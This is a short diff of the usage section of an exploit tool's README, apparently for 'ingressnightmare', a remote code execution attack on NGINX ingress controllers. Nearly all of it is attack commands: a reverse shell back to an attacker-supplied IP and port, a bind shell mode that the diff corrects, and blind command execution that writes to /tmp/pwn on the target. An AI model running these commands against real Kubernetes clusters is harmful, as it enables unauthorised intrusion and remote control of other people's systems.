@@ -23,7 +23,7 @@ triggered remote code execution in the context of the NGINX server.
 ./ingressnightmare -m r -r ${ur_ip} -p ${port} -i ${INGRESS} -u ${UPLOADER} 
 
 # bind shell # maybe lost?
-./ingressnightmare -m r -r ${ur_ip} -p ${port} -i ${INGRESS} -u ${UPLOADER} 
+./ingressnightmare -m b -b ${port} -i ${INGRESS} -u ${UPLOADER} 
 
 # blind command execution
 ./ingressnightmare -m c  -c 'date >> /tmp/pwn; echo eson pwn >> /tmp/pwn' -i ${INGRESS} -u ${UPLOADER} 
